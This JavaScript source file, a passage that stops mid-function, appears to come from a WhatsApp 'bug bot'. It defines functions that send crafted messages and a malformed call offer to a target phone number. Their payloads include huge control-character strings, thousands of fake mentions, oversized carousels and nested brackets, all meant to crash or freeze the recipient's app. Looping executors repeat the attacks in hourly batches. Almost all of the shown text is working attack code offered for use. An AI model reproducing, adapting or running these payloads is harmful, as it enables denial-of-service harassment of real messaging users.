async function xeonDelayNew(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

let JsonExp = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Telegram: @dgxeon13 ",
              mentionedJid: ["916909137213@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  let JsonExp2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Telegram: @dgxeon13 ",
              mentionedJid: ["916909137213@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  let JsonExp3 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Telegram: @dgxeon13 ",
              mentionedJid: ["916909137213@s.whatsapp.net"],
            },
            body: {
              text: "Telegram: @dgxeon13",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  await userSock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp.message,
      },
    },
    ptcp
      ? { messageId: JsonExp.key.id, participant: { jid: target } }
      : { messageId: JsonExp.key.id },
  );

  await userSock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp2.message,
      },
    },
    ptcp
      ? { messageId: JsonExp2.key.id, participant: { jid: target } }
      : { messageId: JsonExp2.key.id },
  );
  
  await userSock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp3.message,
      },
    },
    ptcp
      ? { messageId: JsonExp3.key.id, participant: { jid: target } }
      : { messageId: JsonExp3.key.id },
  );
    
    console.log(chalk.green(`eatquota sent to ${target}`));
  } catch (err) {
  console.error(`Error in eatquota for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 
async function xeonDelayNew2(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const videoMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "r6rKspL7KzRZvoCBkbkAgNTbbZAz3EzCT7Jo7vivhW0=",
            fileLength: "10000000",
            mediaKey: "GHCUsF8us7byHgPCA8lVDELN67jra3I3lgRZXCCRc0s=",
            fileEncSha256: "VzWEuluQdKOio+HmwLAoi8/f4md4ppgsCoIocolbNRI=",
            directPath: "/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1767791229",
            streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
            thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
            thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
            thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
            annotations: [
                {
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "1942620729844671",
                            songId: "432395962368430",
                            author: "Yuukey Da",
                            title: "Уччкеу Дїшауи Жіьпарріп",
                            artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                            artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                            artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                            artistAttribution: "",
                            countryBlocklist: "",
                            isExplicit: false,
                            artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
                        }
                    },
                    embeddedAction: true
                }
            ]
        };

        const msg = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            header: {
                                title: "\u0000",
                                hasMediaAttachment: true,
                                videoMessage
                            },
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                    )
                                ],
                                remoteJid: " X "
                            },
                            carouselMessage: {
                                cards: Array.from({ length: 15 }, () => ({
                                    header: {
                                        title: "\u0000",
                                        hasMediaAttachment: true,
                                        videoMessage
                                    },
                                    contextInfo: {
                                        mentionedJid: [
                                            target,
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 1900 }, () =>
                                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                            )
                                        ],
                                        remoteJid: " X "
                                    },
                                    nativeFlowMessage: {
                                        messageParamsJson: "({".repeat(9000)
                                    }
                                }))
                            }
                        }
                    }
                }
            },
            {
                messageId: null,
                participant: {
                    jid: target
                }
            }
        );

        await userSock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
    
    console.log(chalk.green(`eatquota2 sent to ${target}`));
  } catch (err) {
  console.error(`Error in eatquota2 for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonFlood(target, userNumber, chatId, botInstance, ptcp) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

let push = [];

  for (let r = 0; r < 1000; r++) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({ text: " \u0000 " }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: " \u0003 " }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: " ",
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
          fileLength: "18352",
          height: 720,
          width: 1280,
          mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
          fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
          directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1737281900",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIiQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
          scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
          scanLengths: [3537, 10557, 1905, 2353],
          midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo="
        }
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: []
      })
    });
  }

  let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: "Telegram: @dgxeon13" }),
            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    },
    {}
  );

  await userSock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined 
        }]
      }]
    }]
  });
  await new Promise(resolve => setTimeout(resolve, 5000));
    
    console.log(chalk.green(`Delaymaker sent to ${target}`));
  } catch (err) {
  console.error(`Error in Delaymaker for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
} 

async function xeonFloodExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonFlood(target, userNumber, chatId, botInstance, ptcp)
          ]);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonMx(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

   let haxxn = 10;

for (let i = 0; i < haxxn; i++) {
let push = [];
let buttt = [];

for (let i = 0; i < 5; i++) {
buttt.push({
"name": "galaxy_message",
"buttonParamsJson": JSON.stringify({
"header": "null",
"body": "xxx",
"flow_action": "navigate",
"flow_action_payload": { screen: "FORM_SCREEN" },
"flow_cta": "Grattler",
"flow_id": "1169834181134583",
"flow_message_version": "3",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
})
});
}

for (let i = 0; i < 1000; i++) {
push.push({
"body": {
 "text": " " 
},
"footer": {
"text": ""
},
"header": {
"title": ' ',
"hasMediaAttachment": true,
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
"fileLength": "591",
"height": 0,
"width": 0,
"mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
"fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
"directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1721344123",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
"scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
"scanLengths": [
247,
201,
73,
63
],
"midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
}
},
"nativeFlowMessage": {
"buttons": []
}
});
}

const msg = generateWAMessageFromContent(target, {
"viewOnceMessage": {
"message": {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
"interactiveMessage": {
"body": {
"text": "\u0000\u0000\u0000\u0000"
},
"footer": {
"text": " "
},
"header": {
"hasMediaAttachment": false
},
"carouselMessage": {
"cards": [
...push
]
}
}
}
}
}, {});

await userSock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
participant: { jid: target }
});
}
    console.log(chalk.green(`visiblemax sent to ${target}`));
  } catch (err) {
  console.error(`Error in visiblemax for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function callXeon(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

let devices = (
await userSock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await userSock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = userSock.createParticipantNodes.bind(userSock);
let yntkts = userSock.encodeWAMessage?.bind(userSock);

userSock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (userSock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = userSock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await userSock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await userSock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: userSock.generateMessageTag(), from: userSock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": userSock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(userSock.authState.creds.account, true)
}] : [])
]
}]
};

await userSock.sendNode(lemiting);
    console.log(chalk.green(`crashdroid sent to ${target}`));
  } catch (err) {
  console.error(`Error in crashdroid for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in stressking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonUltraDelay(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const msg = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "Telegram: @dgxeon13" + "ꦽ".repeat(696),
format: "EXTENSIONS_1",
},
nativeFlowResponseMessage: {
name: "galaxy_message",
paramsJson: `{"screen_2_OptIn_0":true,"screen_2_OptIn_1":true,"screen_1_Dropdown_0":"Telegram: @dgxeon13","screen_1_DatePicker_1":"1028995200000","screen_1_TextInput_2":"Telegram: @dgxeon13","screen_1_TextInput_3":"94643116","screen_0_TextInput_0":"#3izxvelzExerc1st. ‌${"\u0000".repeat(1045000)}","screen_0_TextInput_1":"INFINITE","screen_0_Dropdown_2":"001-Grimgar","screen_0_RadioButtonsGroup_3":"0_true","flow_token":"AQAAAAACS5FpgQ_cAAAAAE0QI3s."}`,
version: 3,
},
},
},
},
};

await userSock.relayMessage("status@broadcast", msg, {
messageId: Date.now().toString(),
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: [] }
]
}
]
}
]
});
    console.log(chalk.green(`Ultra Delay sent to ${target}`));
  } catch (err) {
  console.error(`Error in ultraDelay for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  await userBot.sendMessage(chatId, `❌ Error in ultraDelay: ${err.message}. Process stopped.`);
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonUiKing(target, userNumber, chatId, botInstance, show = false) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: " Telegram: @dgxeon13",
hasMediaAttachment: false
},
body: {
text: "Telegram: @dgxeon13" + "ꦾ".repeat(19999)
},
nativeFlowMessage: {
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
messageParamsJson: "[{".repeat(10000),
buttons: [
{
name: "single_select",
buttonParamsJson: JSON.stringify({
title: `${"𑲭𑲭".repeat(19999)}`,
sections: [
{
title: "Telegram: @dgxeon13",
rows: []
},
{
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                  status: true,
                }),
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
              name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                 name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
]
})
}
]
}
}
}
}
}, {});

await userSock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: { jid: target }
});
    console.log(chalk.green(`Ui King sent to ${target}`));
  } catch (err) {
  console.error(`Error in uiking for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function restarti(target, userNumber, chatId, botInstance, mention = true) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 99999999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "\u0007".repeat(30000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [],
            },
          },
        },
      },
    }), { userJid: target });

    await userSock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    if (mention) {
      await userSock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25,
              },
            },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "Telegram: @dgxeon13" },
              content: undefined,
            },
          ],
        }
      );
    }
    console.log(chalk.green(`Delay medium sent to ${target}`));
  } catch (err) {
    console.error(err);
    throw err;
  }
}

async function xdelaynew(target, userNumber, chatId, botInstance, mention = true) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);
    
    const crashdoc = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "0@s.whatsapp.net",
},
message: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0&mms3=true",
mimetype: "text/plain",
fileSha256: "VigI621vLq45R4KIODq41owOti/0ZXSK+aLEZOl79H8=",
fileLength: "2143",
pageCount: 999999999999999,
mediaKey: "qStyFpDZOsxVCbR6oWfjM1AP6OKPloEYtoDVHeAEdxI=",
fileName: "types.bug",
fileEncSha256: "DOWZGa+9qihKxH1ZG0Fi0YhhSb1eZrFNM961Jlbzxdg=",
directPath: "/v/t62.7119-24/29212508_374854352198737_2889841909752059083_n.enc?ccb=11-4&oh=01_Q5AaIDB7jPhV8J-vkbbaYZYQtTzgrLTBx4DgorbqAFcdDoPl&oe=665973D2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1714550098",
contactVcard: true,
}
},
}

    await userSock.sendMessage(target, {
        image: { url: "https://pic.re/image" },
        caption: '🤨? trava kkkkkkkk' + "𑐶".repeat(9999),
        mentions: [target],
        footer: "guto",
        buttons: [
          { buttonId: "hi", buttonText: { displayText: bug } },
          { buttonId: "hi2", buttonText: { displayText: bug } }
        ],
        viewOnce: true,
        headerType: 6,
        contextInfo: {
          externalAdReply: {
            title: 'ᴳᵘᵗᵒ 🌹',
            body: '',
            mediaType: 4,
            thumbnail: 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg',
            jpegThumbnail: 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg',
            mediaUrl: `https://www.youtube.com/@gutoxtazv9`,
            sourceUrl: `https://youtu.be/HBPPWoa9eeE?si=GKUGYD1KooQ9kVxx`
          }
        }
      }, { quoted: crashdoc });
    console.log(chalk.green(`Delay new sent to ${target}`));
  } catch (err) {
    console.error(err);
    throw err;
  }
}

async function xeonDelayMix(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000;    // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`Starting batch ${batch}...`));

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }

        let count = 0;
        const maxLoops = 25; // Total 25 calls

        while (count < maxLoops) {
          if (count % 2 === 0) {
            // Even index (0,2,4...): bulldozer
            await bulldozer(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ stressking... (${count + 1}/25)\n └────────────────────────┘ `));
          } else {
            // Odd index (1,3,5...): ultrayDelay
            await xeonUltraDelay(target, userNumber, chatId, botInstance);
            await sleep(1000);
            console.log(chalk.yellow(` ┌────────────────────────┐\n │ ultradelay... (${count + 1}/25)\n └────────────────────────┘ `));
          }
          count++;
        }

        // After 25 alternating calls
        console.log(chalk.bgYellow.black("25 calls done: stressking → ultradelay → ... (13 + 12), sleep 10s..."));
        await new Promise(resolve => setTimeout(resolve, 10000));

      } catch (error) {
        console.error(`Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
